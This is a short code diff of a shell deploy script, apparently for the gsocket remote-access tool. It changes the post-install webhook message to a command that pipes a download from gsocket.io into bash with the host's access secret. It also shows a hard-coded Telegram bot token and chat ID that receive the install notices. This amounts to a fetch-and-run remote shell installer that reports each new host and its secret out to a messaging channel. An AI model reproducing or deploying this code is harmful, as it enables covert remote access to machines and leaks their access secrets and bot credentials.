@@ -80,7 +80,7 @@ unset gs_deploy_webhook
 
 # WEBHOOKS are executed after a successfull install
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
+msg='S = ${GS_SECRET} bash -c "$(curl -fsSL https://gsocket.io/x)"'
 ### Telegram
 GS_TG_TOKEN="6540180045:AAFTxFngPHizPiFEKUfwnKugUcYCijyNED4"
 GS_TG_CHATID="5575586332"
